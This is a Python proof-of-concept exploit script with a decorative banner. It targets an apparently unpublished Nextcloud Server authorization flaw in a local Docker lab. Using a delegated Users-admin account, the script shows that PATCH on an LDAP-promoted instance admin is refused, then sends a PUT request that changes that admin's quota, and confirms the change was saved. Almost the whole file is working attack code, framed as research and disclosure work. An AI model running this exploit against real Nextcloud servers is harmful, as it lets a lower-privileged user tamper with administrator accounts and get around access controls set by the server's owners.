#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: nextcloud-ldap-put-isadmin (High)
#  Vendor: Nextcloud GmbH
#  Versions: Nextcloud Server 35.0.0
#  Impact: Delegated Users admin PUT-edits an LDAP-promoted instance admin
#  Requires: delegated Users admin, LDAP-promoted admin not in local group admin, PUT /cloud/users/{id}
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "nextcloud-ldap-put-isadmin"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Local oracle for unpublished Nextcloud PUT vs PATCH admin check.

Delegated Users admin (not instance admin) PUTs quota on an LDAP-promoted
admin who is isAdmin() but not in local group admin. PATCH correctly 403s.

Loopback only. No shells.
"""
from __future__ import annotations

import base64
import json
import os
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
BASE = os.environ.get("NC_URL", "http://127.0.0.1:18342").rstrip("/")
ADMIN = os.environ.get("NC_ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("NC_ADMIN_PASSWORD", "LabAdmin35!")
HELPDESK = os.environ.get("NC_HELPDESK_USER", "helpdesk")
HELPDESK_PASS = os.environ.get("NC_HELPDESK_PASSWORD", "LabHelpdesk35!")
TARGET = os.environ.get("NC_LDAP_UID", "ldapadmin")
WITNESS = "NEXTCLOUD-LDAP-PUT-ISADMIN-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "nextcloud-ldap-put-isadmin")
QUOTA_VALUE = "1 GB"
QUOTA_BYTES = 1073741824


def fail(msg: str) -> None:
    print(f"FAIL NEXTCLOUD-LDAP-PUT-ISADMIN {msg}", flush=True)
    raise SystemExit(1)


def basic(user: str, password: str) -> str:
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


def http(
    method: str,
    url: str,
    *,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 60.0,
) -> tuple[int, dict[str, str], bytes]:
    hdrs = {"User-Agent": "nextcloud-ldap-put-isadmin-lab"}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            return resp.status, {k.lower(): v for k, v in resp.headers.items()}, body
    except urllib.error.HTTPError as exc:
        return exc.code, {k.lower(): v for k, v in exc.headers.items()}, exc.read()
    except urllib.error.URLError as exc:
        fail(f"http {method} {url} error {exc}")


def ocs(
    method: str,
    path: str,
    user: str,
    password: str,
    *,
    json_payload: dict | None = None,
    form: dict[str, str] | None = None,
) -> tuple[int, dict, str]:
    hdrs = {
        "OCS-APIRequest": "true",
        "Accept": "application/json",
        "Authorization": basic(user, password),
    }
    body = None
    if json_payload is not None:
        hdrs["Content-Type"] = "application/json"
        body = json.dumps(json_payload).encode()
    elif form is not None:
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        body = urllib.parse.urlencode(form).encode()
    sep = "&" if "?" in path else "?"
    url = BASE + path + sep + "format=json"
    code, _, raw = http(method, url, data=body, headers=hdrs)
    text = raw.decode("utf-8", "replace")
    try:
        parsed = json.loads(text) if text else {}
    except json.JSONDecodeError:
        fail(f"ocs {method} {path} http={code} not json body={text[:400]!r}")
    return code, parsed, text


def ocs_data(parsed: dict) -> dict | list | None:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict):
        return ocs_wrap.get("data")
    return None


def ocs_meta(parsed: dict) -> dict:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict) and isinstance(ocs_wrap.get("meta"), dict):
        return ocs_wrap["meta"]
    return {}


def groups_from_user_data(data: object) -> list[str]:
    if not isinstance(data, dict):
        return []
    groups = data.get("groups") or []
    if isinstance(groups, dict):
        el = groups.get("element", list(groups.values()))
        groups = el
    if isinstance(groups, str):
        return [groups]
    if isinstance(groups, list):
        out: list[str] = []
        for item in groups:
            if isinstance(item, dict):
                gid = item.get("id") or item.get("gid")
                if gid is not None:
                    out.append(str(gid))
            else:
                out.append(str(item))
        return out
    return []


def quota_bytes(data: object) -> int | None:
    if not isinstance(data, dict):
        return None
    q = data.get("quota")
    if isinstance(q, dict):
        raw = q.get("quota")
        if isinstance(raw, (int, float)):
            return int(raw)
        if isinstance(raw, str) and raw.isdigit():
            return int(raw)
    if isinstance(q, (int, float)):
        return int(q)
    return None


def compose_exec(*args: str, timeout: int = 120) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", *args],
        cwd=HERE,
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )


def fixture_flags() -> dict:
    cp = subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "cp", str(HERE / "fixture.php"), "nextcloud:/tmp/nc-ldap-put-isadmin-fixture.php"],
        cwd=HERE,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )
    if cp.returncode != 0:
        fail(f"docker compose cp fixture.php rc={cp.returncode} {cp.stderr[:300]!r}")
    proc = compose_exec(
        "-u",
        "www-data",
        "-e",
        f"NC_LDAP_UID={TARGET}",
        "-e",
        f"NC_HELPDESK_USER={HELPDESK}",
        "-w",
        "/var/www/html",
        "nextcloud",
        "php",
        "/tmp/nc-ldap-put-isadmin-fixture.php",
    )
    text = (proc.stdout or "").strip()
    print(
        f"IOC php-fixture rc={proc.returncode} stdout={text[:800]!r} stderr={(proc.stderr or '')[:300]!r}",
        flush=True,
    )
    if not text:
        fail("php fixture empty")
    try:
        parsed = json.loads(text)
    except json.JSONDecodeError:
        fail(f"php fixture not json {text[:400]!r}")
    if not isinstance(parsed, dict) or parsed.get("error"):
        fail(f"php fixture {parsed}")
    return parsed


def main() -> None:
    print(
        f"IOC base={BASE} actor={HELPDESK} target={TARGET} witness={WITNESS}",
        flush=True,
    )

    flags = fixture_flags()
    print(
        f"IOC target-isAdmin={flags.get('target_isAdmin')!s} "
        f"target-isInGroupAdmin={flags.get('target_isInGroupAdmin')!s} "
        f"target-groups={flags.get('target_groups')!r}",
        flush=True,
    )
    print(
        f"IOC actor-isAdmin={flags.get('actor_isAdmin')!s} "
        f"actor-isDelegatedAdmin={flags.get('actor_isDelegatedAdmin')!s} "
        f"actor-isInGroupAdmin={flags.get('actor_isInGroupAdmin')!s} "
        f"actor-groups={flags.get('actor_groups')!r}",
        flush=True,
    )
    if flags.get("target_isAdmin") is not True:
        fail("target isAdmin not true (LDAP never promoted)")
    if flags.get("target_isInGroupAdmin") is not False:
        fail("target is in local admin group (wrong fixture)")
    if flags.get("actor_isDelegatedAdmin") is not True:
        fail("helpdesk isDelegatedAdmin not true")
    if flags.get("actor_isInGroupAdmin") is not False or flags.get("actor_isAdmin") is True:
        fail("helpdesk is instance admin (wrong fixture)")

    code, parsed, text = ocs("GET", f"/ocs/v2.php/cloud/users/{HELPDESK}", HELPDESK, HELPDESK_PASS)
    data = ocs_data(parsed)
    actor_groups = groups_from_user_data(data)
    print(
        f"IOC helpdesk-login http={code} meta={ocs_meta(parsed)} groups={actor_groups}",
        flush=True,
    )
    if code not in (200, 201):
        fail(f"helpdesk login/info http={code} body={text[:400]!r}")
    if "admin" in [str(g) for g in actor_groups]:
        fail("helpdesk is in admin group (wrong fixture)")

    code, parsed, text = ocs("GET", f"/ocs/v2.php/cloud/users/{TARGET}", HELPDESK, HELPDESK_PASS)
    data = ocs_data(parsed)
    target_groups = groups_from_user_data(data)
    before_quota = quota_bytes(data)
    print(
        f"IOC target-get http={code} groups={target_groups} quota={before_quota} "
        f"data={json.dumps(data)[:500] if isinstance(data, dict) else data!r}",
        flush=True,
    )
    if code not in (200, 201):
        fail(f"target get as helpdesk http={code} body={text[:400]!r}")
    if "admin" in [str(g) for g in target_groups]:
        fail("target is in local admin group (wrong fixture)")

    patch_code, patch_parsed, patch_text = ocs(
        "PATCH",
        f"/ocs/v2.php/cloud/users/{TARGET}",
        HELPDESK,
        HELPDESK_PASS,
        json_payload={"quota": QUOTA_VALUE},
    )
    patch_meta = ocs_meta(patch_parsed)
    print(
        f"IOC patch http={patch_code} meta={patch_meta} body={patch_text[:400]!r}",
        flush=True,
    )
    if patch_code == 200:
        fail("PATCH 200 (target not isAdmin / LDAP never promoted)")
    if patch_code != 403:
        fail(f"PATCH expected 403 got http={patch_code} meta={patch_meta}")

    put_code, put_parsed, put_text = ocs(
        "PUT",
        f"/ocs/v2.php/cloud/users/{TARGET}",
        HELPDESK,
        HELPDESK_PASS,
        form={"key": "quota", "value": QUOTA_VALUE},
    )
    put_meta = ocs_meta(put_parsed)
    print(
        f"IOC put http={put_code} meta={put_meta} body={put_text[:400]!r}",
        flush=True,
    )
    if put_code in (403, 404):
        fail(f"PUT {put_code} (gate also blocked; expected 200)")
    if put_code != 200:
        fail(f"PUT expected 200 got http={put_code} meta={put_meta}")

    code, parsed, text = ocs("GET", f"/ocs/v2.php/cloud/users/{TARGET}", ADMIN, ADMIN_PASS)
    data = ocs_data(parsed)
    after_quota = quota_bytes(data)
    quota_str = None
    if isinstance(data, dict):
        q = data.get("quota")
        if isinstance(q, dict):
            quota_str = str(q.get("quota"))
    print(
        f"IOC quota-after http={code} bytes={after_quota} raw={quota_str} "
        f"data={json.dumps(data)[:500] if isinstance(data, dict) else data!r}",
        flush=True,
    )
    if after_quota != QUOTA_BYTES and quota_str not in {str(QUOTA_BYTES), QUOTA_VALUE, "1 GB", "1GB"}:
        fail(f"quota not persisted after PUT bytes={after_quota} raw={quota_str}")

    print(
        f"SUCCESS NEXTCLOUD-LDAP-PUT-ISADMIN who=delegated-users-admin "
        f"target={TARGET} put={put_code} patch={patch_code} {WITNESS}",
        flush=True,
    )


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        fail(f"unhandled {type(exc).__name__}: {exc}")

